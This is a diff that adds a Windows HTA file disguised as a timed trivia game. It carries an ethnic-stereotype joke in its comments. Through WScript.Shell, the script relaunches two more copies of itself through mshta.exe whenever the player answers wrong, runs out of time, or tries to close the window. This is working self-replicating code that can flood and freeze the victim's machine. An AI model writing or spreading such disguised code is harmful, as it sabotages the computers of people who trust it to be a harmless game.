@@ -1,0 +1,195 @@
+<html>
+<head>
+  <title>Let's play a game</title>
+  <HTA:APPLICATION
+    ID="app"
+    SINGLEINSTANCE="no"
+    BORDER="thin"
+    CAPTION="yes"
+    SHOWINTASKBAR="yes"
+    SCROLL="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+  />
+  <script type="text/javascript">
+    // 🎓 Welcome to "Be Asian, not B-sian"! Time to flex those brain muscles!
+    var qna = [
+      ["What is the capital city of Bhutan?", "thimphu"],
+      ["First female Prime Minister of the United Kingdom?", "margaret thatcher"],
+      ["Author of the novel '1984'?", "george orwell"],
+      ["Who discovered penicillin?", "alexander fleming"],
+      ["Which ocean is the largest on Earth?", "pacific"],
+      ["Which river is the longest in the world?", "nile"],
+      ["Who painted the Mona Lisa?", "leonardo da vinci"],
+      ["Who painted the ceiling of the Sistine Chapel?", "michelangelo"],
+      ["What is the chemical symbol for gold?", "au"],
+      ["In which country is Machu Picchu located?", "peru"],
+      ["Which language has the most native speakers worldwide?", "mandarin"],
+      ["Who is known as the father of modern computers?", "charles babbage"],
+      ["Inventor of the telephone?", "alexander graham bell"],
+      ["Author of 'Pride and Prejudice'?", "jane austen"],
+      ["City known as the Big Apple?", "new york"],
+      ["Tallest mountain in the world?", "everest"],
+      ["Largest desert in the world?", "sahara"],
+      ["First man in space?", "yuri gagarin"],
+      ["First woman in space?", "valentina tereshkova"],
+      ["Scientist who formulated the laws of motion?", "isaac newton"],
+      ["Currency of Japan?", "yen"],
+      ["Capital of Australia?", "canberra"],
+      ["The Great Wall is in which country?", "china"],
+      ["Capital of Canada?", "ottawa"],
+      ["Inventor of the light bulb?", "thomas edison"],
+      ["Author of 'To Kill a Mockingbird'?", "harper lee"],
+      ["Largest mammal?", "blue whale"],
+      ["Fastest land animal?", "cheetah"],
+      ["National sport of Japan?", "sumo wrestling"],
+      ["Capital of Egypt?", "cairo"],
+      ["Currency of the UK?", "pound"],
+      ["Author of 'The Hobbit'?", "j r r tolkien"],
+      ["Largest country by area?", "russia"],
+      ["Smallest country by area?", "vatican city"],
+      ["Capital of Russia?", "moscow"],
+      ["Capital of India?", "new delhi"],
+      ["Who painted 'Starry Night'?", "vincent van gogh"],
+      ["Scientist who proposed evolution by natural selection?", "charles darwin"],
+      ["Capital of Brazil?", "brasilia"],
+      ["Currency of India?", "rupee"],
+      ["First president of the United States?", "george washington"],
+      ["Capital of Germany?", "berlin"],
+      ["Largest volcano in the world?", "mauna loa"],
+      ["Which planet has rings?", "saturn"],
+      ["Closest star to Earth?", "sun"],
+      ["Largest lake by area?", "caspian sea"],
+      ["Capital of Italy?", "rome"],
+      ["Famous clock tower in London?", "big ben"],
+      ["The Taj Mahal is in which country?", "india"],
+      ["Currency of the European Union?", "euro"],
+      ["Who invented the World Wide Web?", "tim berners lee"],
+      ["Ocean between Africa and Australia?", "indian"],
+      ["Capital of Spain?", "madrid"],
+      ["Capital of Mexico?", "mexico city"],
+      ["Capital of Argentina?", "buenos aires"],
+      ["First artificial satellite?", "sputnik"],
+      ["Which gas do plants absorb?", "carbon dioxide"],
+      ["Process by which plants make food?", "photosynthesis"],
+      ["Largest continent?", "asia"],
+      ["Capital of South Korea?", "seoul"],
+      ["Highest waterfall?", "angel falls"],
+      ["Who wrote 'The Odyssey'?", "homer"],
+      ["Who wrote 'Crime and Punishment'?", "fyodor dostoevsky"],
+      ["Country known as Land of the Rising Sun?", "japan"],
+      ["Roman god of war?", "mars"],
+      ["Norse god of thunder?", "thor"],
+      ["Chemical symbol for iron?", "fe"],
+      ["Chemical symbol for oxygen?", "o"],
+      ["Chemical symbol for sodium?", "na"],
+      ["Chemical symbol for potassium?", "k"],
+      ["Author of 'Frankenstein'?", "mary shelley"],
+      ["Author of 'The Divine Comedy'?", "dante alighieri"],
+      ["Capital of Norway?", "oslo"],
+      ["Capital of Sweden?", "stockholm"],
+      ["Capital of Finland?", "helsinki"],
+      ["Capital of Denmark?", "copenhagen"],
+      ["Capital of Iceland?", "reykjavik"],
+      ["Capital of Greece?", "athens"],
+      ["Capital of Turkey?", "ankara"],
+      ["Capital of Saudi Arabia?", "riyadh"],
+      ["Capital of South Africa?", "pretoria"],
+      ["Capital of Nigeria?", "abuja"],
+      ["Capital of Kenya?", "nairobi"],
+      ["Capital of Morocco?", "rabat"],
+      ["Currency of China?", "renminbi"],
+      ["Which element has atomic number 1?", "hydrogen"],
+      ["Which element has atomic number 6?", "carbon"],
+      ["Which element has atomic number 26?", "iron"],
+      ["Winner of first FIFA World Cup?", "uruguay"],
+      ["Year of first moon landing?", "1969"],
+      ["Author of the Harry Potter series?", "jk rowling"],
+      ["Creator of the sitcom 'Friends'?", "david crane"],
+      ["Creator of 'The Simpsons'?", "matt groening"],
+      ["Director of 'Jurassic Park'?", "steven spielberg"],
+      ["Composer of the Fifth Symphony?", "beethoven"],
+      ["Composer of The Four Seasons?", "vivaldi"],
+      ["Capital of Portugal?", "lisbon"]
+    ];
+    var TIME_LIMIT = 10; // ⏳ You have 10 seconds, not a whole semester!
+
+    function randomPos() {
+      // ✈️ Pop quiz coming in hot! Let's land the window somewhere random!
+      return {
+        x: Math.floor(Math.random() * (screen.availWidth  - 360)),
+        y: Math.floor(Math.random() * (screen.availHeight - 260))
+      };
+    }
+
+    function spawn(n) {
+      // 📚 Failed? Get more homework! (a.k.a more windows)
+      var shell = new ActiveXObject("WScript.Shell");
+      for (var i = 0; i < n; i++) {
+        shell.Run('mshta.exe "' + location.pathname + '"', 1, false);
+      }
+    }
+
+    var allowClose = false;
+    window.onbeforeunload = function() {
+      // 🚫 No rage-quitting allowed without more studying!
+      if (!allowClose) spawn(2);
+    };
+
+    window.onload = function() {
+      // 🧠 Time to show you're not B-sian — randomize window position!
+      var pos = randomPos();
+      window.resizeTo(360, 260);
+      window.moveTo(pos.x, pos.y);
+
+      var idx = Math.floor(Math.random() * qna.length),
+          question = qna[idx][0],
+          correct = qna[idx][1];
+
+      // 📝 Quick quiz time! Type fast, think faster!
+      document.body.innerHTML = ''
+        + '<h3 style="text-align:center;color:#eee;margin:0 0 10px;">'
+        +  question
+        + '</h3>'
+        + '<div style="text-align:center;">'
+        +   '<input id="ans" style="width:200px;font-size:14px;" autofocus>'
+        +   '<button id="sub" style="font-size:14px;margin-left:5px;">Submit</button>'
+        + '</div>'
+        + '<p style="text-align:center;color:#ccc;margin-top:8px;">'
+        +   'Time left: <span id="t">'+TIME_LIMIT+'</span>s'
+        + '</p>';
+
+      var t = TIME_LIMIT,
+          timerE = document.getElementById("t"),
+          iv = setInterval(function() {
+            t--;
+            if (t <= 0) {
+              clearInterval(iv);
+              allowClose = true;
+              spawn(2);
+              window.close();
+            } else {
+              timerE.innerText = t;
+            }
+          }, 1000);
+
+      document.getElementById("sub").onclick = function() {
+        clearInterval(iv);
+        var raw = document.getElementById("ans").value;
+        var ans = raw.replace(/^\s+|\s+$/g, "").toLowerCase();
+        allowClose = true;
+        if (ans !== correct) {
+          // 😬 Wrong answer? More quizzes coming your way!
+          spawn(2);
+        }
+        window.close();
+      };
+    };
+  </script>
+  <style>
+    body { background: #222; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
+  </style>
+</head>
+<body>
+</body>
+</html>
